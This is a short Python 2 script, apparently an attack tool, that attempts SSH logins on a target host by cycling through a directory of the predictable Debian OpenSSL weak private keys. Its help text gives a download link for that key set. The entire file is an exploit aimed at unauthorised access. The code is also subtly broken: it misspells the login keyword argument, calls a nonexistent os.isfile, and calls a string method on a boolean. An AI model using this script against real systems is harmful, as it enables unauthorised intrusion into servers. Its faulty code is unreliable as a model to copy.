from pexpect import pxssh
import optparse
import os


def checkSshKey(host, user, keyPath):
	"""
	Checks if the key can be used for connection.
	"""
	keyWorked = False
	connection = pxssh.pxssh()
	try:
		connection.login(host, user, ssk_key = keyPath)
		keyWorked = True
		connection.close()
	except Exception, e:
		print str(e)
		pass

	return keyWorked


def main():
	parser = optparse.OptionParser(add_help_option = False, usage = 'Usage: %prog -h host -u user -d dir-with-keys')
	parser.add_option('-h', dest = 'host', help = 'Host to try')
	parser.add_option('-u', dest = 'user', help = 'User to test')
	parser.add_option('-d', dest = 'keysDir', help = 'Directory with keys from http://digitaloffense.net/tools/debian-openssl/debian_ssh_dsa_1024_x86.tar.bz2')
	(options, arguments) = parser.parse_args()
	
	if options.host is None or options.user is None or options.keysDir is None:
		parser.print_help();
		exit(1)

	if not os.path.isdir(options.keysDir):
		print "Directory with keys does not exist"
		exit(1)

	for entry in os.listdir(options.keysDir):
		path = os.isfile(options.keysDir + os.sep + entry)
		if not path.endswith('.pub') and os.isfile(path):
			checkSshKey(options.host, options.user, path)


main()

